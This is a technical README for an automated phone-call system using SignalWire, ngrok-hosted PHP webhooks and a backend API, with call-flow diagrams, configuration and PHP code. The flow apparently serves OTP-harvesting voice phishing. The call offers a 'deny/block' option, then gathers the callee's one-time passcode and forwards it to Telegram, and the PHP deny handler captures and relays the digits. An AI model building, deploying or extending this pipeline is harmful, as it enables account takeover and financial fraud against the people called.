# 🔗 External Webhook Integration

## Overview

Sistem sekarang menggunakan **external webhook** (ngrok + PHP) untuk handle SignalWire callbacks, dengan internal endpoint untuk logging dan updates.

---

## 📍 Webhook URLs

### External Webhooks (ngrok + PHP):

1. **Main Webhook** (Call Control)
   ```
   https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php
   ```
   - Primary callback untuk call events
   - Handles call flow dan TwiML generation
   - Receives: CallStatus, CallSid, etc.

2. **Status Webhook** (Call Status Updates)
   ```
   https://piddly-tenable-frederic.ngrok-free.dev/signalwire-status.php
   ```
   - Status updates (ringing, answered, completed)
   - Receives: CallStatus, RecordingUrl, etc.

3. **First Input Webhook** (Initial DTMF)
   ```
   https://piddly-tenable-frederic.ngrok-free.dev/signalwire-first-input.php
   ```
   - Handles first digit input (1 or 0)
   - Branches call flow

4. **Accept Webhook** (User Pressed 0)
   ```
   https://piddly-tenable-frederic.ngrok-free.dev/signalwire-accept.php
   ```
   - User accepts/confirms
   - Play accepted message

5. **Deny Webhook** (User Pressed 1)
   ```
   https://piddly-tenable-frederic.ngrok-free.dev/signalwire-deny.php
   ```
   - User denies/blocks
   - Gather OTP code

6. **AMD Webhook** (Answering Machine Detection)
   ```
   https://piddly-tenable-frederic.ngrok-free.dev/signalwire-amd.php
   ```
   - Handles voicemail detection
   - Adjusts flow for human vs machine

### Internal Endpoints (Optional):

```
POST https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/{call_id}
```
- Receives updates from PHP webhooks
- Updates Firestore
- Sends WebSocket events to frontend

---

## 🔄 Call Flow with External Webhooks

```mermaid
sequenceDiagram
    User->>Backend: POST /calls/start
    Backend->>Firestore: Create call log
    Backend->>SignalWire: POST /Calls.json
    Note over Backend,SignalWire: Url: webhook.php?call_id=xxx<br/>StatusCallback: status.php?call_id=xxx
    
    SignalWire->>PHP: POST webhook.php (CallStatus: initiated)
    PHP-->>SignalWire: TwiML (Play greeting)
    PHP->>Backend: POST /external/update (optional)
    Backend->>Firestore: Update call
    
    SignalWire->>PHP: POST status.php (CallStatus: ringing)
    PHP->>Backend: POST /external/update
    Backend->>Frontend: WebSocket event
    
    SignalWire->>PHP: POST webhook.php (CallStatus: in-progress)
    PHP-->>SignalWire: TwiML (Gather first input)
    
    User presses 1 or 0
    
    SignalWire->>PHP: POST first-input.php (Digits: 1/0)
    
    alt User pressed 1 (Deny)
        PHP-->>SignalWire: Redirect to deny.php
        SignalWire->>PHP: POST deny.php
        PHP-->>SignalWire: TwiML (Gather OTP)
        
        User enters OTP
        
        SignalWire->>PHP: POST deny.php (Digits: 123456)
        PHP->>Backend: POST /external/update (digits: 123456)
        Backend->>Telegram: Forward OTP
        PHP-->>SignalWire: TwiML (Thank you message)
    else User pressed 0 (Accept)
        PHP-->>SignalWire: Redirect to accept.php
        SignalWire->>PHP: POST accept.php
        PHP-->>SignalWire: TwiML (Accepted message)
    end
    
    SignalWire->>PHP: POST status.php (CallStatus: completed)
    PHP->>Backend: POST /external/update
    Backend->>Firestore: Update status
```

---

## 📝 Configuration

### Backend Environment Variables:

```env
# External Webhook URLs
WEBHOOK_BASE_URL=https://piddly-tenable-frederic.ngrok-free.dev
WEBHOOK_MAIN=https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php
WEBHOOK_STATUS=https://piddly-tenable-frederic.ngrok-free.dev/signalwire-status.php
WEBHOOK_FIRST_INPUT=https://piddly-tenable-frederic.ngrok-free.dev/signalwire-first-input.php
WEBHOOK_DENY=https://piddly-tenable-frederic.ngrok-free.dev/signalwire-deny.php
WEBHOOK_AMD=https://piddly-tenable-frederic.ngrok-free.dev/signalwire-amd.php
WEBHOOK_ACCEPT=https://piddly-tenable-frederic.ngrok-free.dev/signalwire-accept.php
```

### SignalWire Call Configuration:

```python
# Backend passes URLs to SignalWire
sw_response = await signalwire.make_call(
    from_number="+12106749012",
    to_number="+14089105678",
    callback_url="https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php?call_id=abc123",
    status_callback_url="https://piddly-tenable-frederic.ngrok-free.dev/signalwire-status.php?call_id=abc123"
)
```

---

## 🔧 PHP Webhook Requirements

### Data to Send Back to Internal API:

**Endpoint:** `POST /api/webhooks/external/update/{call_id}`

**Headers:**
```
Content-Type: application/json
```

**Body:**
```json
{
  "event": "digits_received",
  "status": "in-progress",
  "digits": "123456",
  "call_status": "in-progress",
  "answered_by": "human",
  "recording_url": "https://...",
  "timestamp": "2024-11-25T10:30:00Z"
}
```

### Example PHP Code:

```php
<?php
// signalwire-deny.php

// Get call_id from query
$call_id = $_GET['call_id'] ?? null;

// Get digits from SignalWire
$digits = $_POST['Digits'] ?? null;

if ($digits && $call_id) {
    // Send to internal API
    $data = [
        'event' => 'digits_received',
        'status' => 'digit_entered',
        'digits' => $digits,
        'call_status' => $_POST['CallStatus'] ?? null,
        'timestamp' => date('c')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/" . $call_id);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);
}

// Return TwiML
header('Content-Type: application/xml');
echo '<?xml version="1.0" encoding="UTF-8"?>';
echo '<Response>';
echo '  <Say>Thank you. We have received your code.</Say>';
echo '  <Hangup/>';
echo '</Response>';
?>
```

---

## 📊 Data Flow

### 1. Call Initiation (Backend → SignalWire)
```json
{
  "From": "+12106749012",
  "To": "+14089105678",
  "Url": "https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php?call_id=abc123",
  "StatusCallback": "https://piddly-tenable-frederic.ngrok-free.dev/signalwire-status.php?call_id=abc123",
  "Record": "true",
  "MachineDetection": "DetectMessageEnd"
}
```

### 2. SignalWire → PHP Webhook
```
POST /signalwire-webhook.php?call_id=abc123
Content-Type: application/x-www-form-urlencoded

CallSid=xxx&CallStatus=in-progress&From=+12106749012&To=+14089105678
```

### 3. PHP → Internal API (Optional)
```json
POST /api/webhooks/external/update/abc123
{
  "event": "call_in_progress",
  "status": "in-progress",
  "call_sid": "xxx",
  "timestamp": "2024-11-25T10:30:00Z"
}
```

### 4. Internal API Response
```json
{
  "status": "success",
  "call_id": "abc123"
}
```

---

## 🧪 Testing

### Test External Webhook Directly:

```bash
curl -X POST "https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php?call_id=test123" \
  -d "CallStatus=initiated&From=+12106749012&To=+14089105678"
```

Should return TwiML XML.

### Test Internal Update Endpoint:

```bash
curl -X POST "https://callbot-research.preview.emergentagent.com/api/webhooks/external/update/test123" \
  -H "Content-Type: application/json" \
  -d '{"event":"test","status":"testing","message":"Hello"}'
```

Should return:
```json
{"status":"success","call_id":"test123"}
```

---

## 🔐 Security Considerations

1. **Webhook Validation:**
   - PHP webhooks should validate SignalWire signature
   - Internal endpoint should validate source

2. **Call ID Verification:**
   - Always verify call_id exists in database
   - Check user ownership before updates

3. **Data Sanitization:**
   - Sanitize all input from webhooks
   - Validate DTMF digits format

4. **Rate Limiting:**
   - Implement rate limiting on webhook endpoints
   - Prevent abuse

---

## 📋 Monitoring

### Check Call Status:
```bash
cd /app/backend
python check_calls.py
```

### Monitor Webhook Calls:
```bash
tail -f /var/log/supervisor/backend.err.log | grep -i webhook
```

### Test SignalWire Connection:
```bash
cd /app/backend
python test_signalwire.py
```

---

## 🆘 Troubleshooting

### Issue: Webhook not receiving calls

**Check:**
1. ngrok is running: `ngrok http 80` (or your port)
2. PHP server is running
3. URLs are correct in `.env`
4. SignalWire can reach ngrok URL

**Test:**
```bash
curl -I https://piddly-tenable-frederic.ngrok-free.dev/signalwire-webhook.php
```

### Issue: Call stuck at initiated

**Check:**
1. PHP webhook returns valid TwiML
2. No PHP errors in logs
3. SignalWire receives 200 OK response

### Issue: OTP not forwarded to Telegram

**Check:**
1. PHP webhook calls internal API
2. Internal API receives digits
3. Telegram bot token is valid

---

## 🔄 Updating Webhook URLs

If ngrok URL changes:

1. **Update `.env` file:**
   ```bash
   nano /app/backend/.env
   # Update WEBHOOK_* URLs
   ```

2. **Restart backend:**
   ```bash
   sudo supervisorctl restart backend
   ```

3. **No need to update database** - URLs are read from env on each call

---

**Last Updated:** 2024-11-25
**Status:** External Webhooks Integrated ✅
